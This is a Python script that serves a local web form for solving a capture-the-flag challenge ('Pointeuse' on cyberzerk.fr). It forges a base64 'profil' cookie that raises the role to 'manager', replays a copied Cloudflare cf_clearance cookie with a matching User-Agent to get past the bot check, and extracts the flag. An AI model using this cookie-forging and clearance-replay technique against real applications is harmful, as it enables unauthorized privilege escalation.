#!/usr/bin/env python3
# solve_gui.py — lokale Mini-GUI fuer den CyberZerk "Pointeuse"-Solver
#
# Laeuft auf DEINEM Mac: der HTTP-Request geht von deiner IP raus,
# darum akzeptiert Cloudflare das cf_clearance-Cookie.
#
# Start:   python3 solve_gui.py
# Oeffnet automatisch http://127.0.0.1:8777 im Browser.

import base64, re, html, webbrowser, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import requests

DEFAULT_UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
              "AppleWebKit/537.36 (KHTML, like Gecko) "
              "Chrome/157.0.0.0 Safari/537.36")
DEFAULT_URL = "https://pointeuse.cyberzerk.fr/"
DEFAULT_PAYLOAD = '{"employe":"Vous (#8472)","role":"manager"}'

PORT = 8777


def run_solve(url, cf, ua, payload):
    """Deterministisch: Payload -> Base64 -> Request -> Regex-Oracle."""
    forged = base64.b64encode(payload.encode()).decode()
    try:
        r = requests.get(
            url,
            headers={"User-Agent": ua},
            cookies={"cf_clearance": cf, "profil": forged},
            timeout=20,
        )
    except Exception as e:
        return forged, None, None, f"Request fehlgeschlagen: {e}"
    m = re.search(r"CyberZerk\{.*?\}", r.text)
    return forged, r.status_code, (m.group() if m else None), None


def render(url=DEFAULT_URL, cf="", ua=DEFAULT_UA,
           payload=DEFAULT_PAYLOAD, result_html=""):
    e = html.escape
    return f"""<!doctype html><html lang="de"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Pointeuse Solver</title><style>
:root{{color-scheme:dark}}
*{{box-sizing:border-box}}
body{{font:15px/1.5 -apple-system,system-ui,sans-serif;background:#0d1117;
color:#e6edf3;margin:0;padding:32px 16px;display:flex;justify-content:center}}
.wrap{{width:100%;max-width:640px}}
h1{{font-size:20px;margin:0 0 4px}}
.sub{{color:#8b949e;margin:0 0 24px;font-size:13px}}
label{{display:block;font-weight:600;margin:18px 0 4px}}
.hint{{color:#8b949e;font-size:12px;font-weight:400;margin:2px 0 6px}}
input,textarea{{width:100%;background:#161b22;border:1px solid #30363d;
border-radius:8px;color:#e6edf3;padding:10px 12px;font:13px/1.4 ui-monospace,
SFMono-Regular,Menlo,monospace}}
textarea{{resize:vertical;min-height:52px}}
button{{margin-top:22px;background:#238636;border:0;border-radius:8px;
color:#fff;font-size:15px;font-weight:600;padding:11px 20px;cursor:pointer}}
button:hover{{background:#2ea043}}
.box{{margin-top:24px;border:1px solid #30363d;border-radius:8px;
padding:16px;background:#161b22}}
.box .k{{color:#8b949e;font-size:12px;margin-top:10px}}
.box .v{{font:13px ui-monospace,Menlo,monospace;word-break:break-all}}
.flag{{font-size:18px;color:#3fb950;font-weight:700;word-break:break-all}}
.fail{{color:#f85149;font-weight:600}}
</style></head><body><div class="wrap">
<h1>Pointeuse Solver</h1>
<p class="sub">Laeuft lokal auf deinem Mac. Der Request geht von deiner IP &rarr;
Cloudflare akzeptiert das cf_clearance-Cookie.</p>
<form method="post" action="/solve">
  <label>Ziel-URL</label>
  <div class="hint">Die Challenge-Seite. Normalerweise unveraendert.</div>
  <input name="url" value="{e(url)}">

  <label>cf_clearance</label>
  <div class="hint">Chrome DevTools &rarr; Application &rarr; Cookies &rarr;
  pointeuse.cyberzerk.fr &rarr; Wert von <b>cf_clearance</b> kopieren.
  Laeuft ab &mdash; immer frisch holen.</div>
  <input name="cf" value="{e(cf)}" placeholder="cf_clearance...">

  <label>User-Agent</label>
  <div class="hint">DevTools &rarr; Console &rarr; <code>navigator.userAgent</code>.
  Muss zum Browser passen, der cf_clearance geholt hat.</div>
  <input name="ua" value="{e(ua)}">

  <label>Cookie-Payload (JSON)</label>
  <div class="hint">Der Trick: <b>role</b> von <code>employe</code> auf
  <code>manager</code>. Wird Base64-kodiert und als <b>profil</b>-Cookie gesendet.</div>
  <textarea name="payload">{e(payload)}</textarea>

  <button type="submit">Flag holen</button>
</form>
{result_html}
</div></body></html>"""


def render_result(forged, status, flag, error):
    e = html.escape
    if error:
        body = f'<div class="fail">{e(error)}</div>'
    elif flag:
        body = f'<div class="flag">{e(flag)}</div>'
    else:
        body = ('<div class="fail">Kein Flag gefunden.</div>'
                '<div class="hint">cf_clearance abgelaufen, User-Agent passt '
                'nicht, oder Payload falsch.</div>')
    parts = [f'<div class="box">{body}']
    parts.append(f'<div class="k">profil-Cookie (Base64)</div>'
                 f'<div class="v">{e(forged)}</div>')
    if status is not None:
        parts.append(f'<div class="k">HTTP Status</div><div class="v">{status}</div>')
    parts.append('</div>')
    return "".join(parts)


class Handler(BaseHTTPRequestHandler):
    def _send(self, body):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(body.encode())

    def log_message(self, *a):
        pass

    def do_GET(self):
        self._send(render())

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        d = parse_qs(self.rfile.read(n).decode())
        g = lambda k, dv="": d.get(k, [dv])[0]
        url, cf, ua, payload = g("url", DEFAULT_URL), g("cf"), g("ua", DEFAULT_UA), g("payload", DEFAULT_PAYLOAD)
        forged, status, flag, error = run_solve(url, cf, ua, payload)
        self._send(render(url, cf, ua, payload,
                          render_result(forged, status, flag, error)))


if __name__ == "__main__":
    srv = HTTPServer(("127.0.0.1", PORT), Handler)
    url = f"http://127.0.0.1:{PORT}"
    print(f"Pointeuse Solver laeuft:  {url}   (Strg+C zum Beenden)")
    threading.Timer(0.6, lambda: webbrowser.open(url)).start()
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\nBeendet.")
